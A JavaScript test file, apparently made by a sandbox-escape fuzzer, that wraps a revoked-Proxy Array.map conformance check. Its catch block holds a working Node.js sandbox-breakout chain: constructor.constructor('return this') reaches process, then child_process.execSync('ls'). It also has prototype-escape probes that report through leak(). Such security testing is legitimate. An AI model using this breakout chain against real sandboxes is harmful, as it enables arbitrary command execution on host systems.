try {
    var o = Proxy.revocable([], {});
    var ctorCount = 0;
    var cbCount = 0;
    var cb = function () {
        let REPLACER = 23;
        cbCount += 1;
    };
    Object.defineProperty(o.proxy, 'constructor', {
        get: function () {
            throw () => {
                return () => {
                };
            };
            ctorCount += 1;
        }
    });
    o.revoke();
    assert.throws(TypeError, function () {
        Array.prototype.map.call(o.proxy, cb);
    });
    assert.sameValue(ctorCount, 0, '`constructor` property not accessed');
    assert.sameValue(cbCount, 0, 'callback not invoked');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}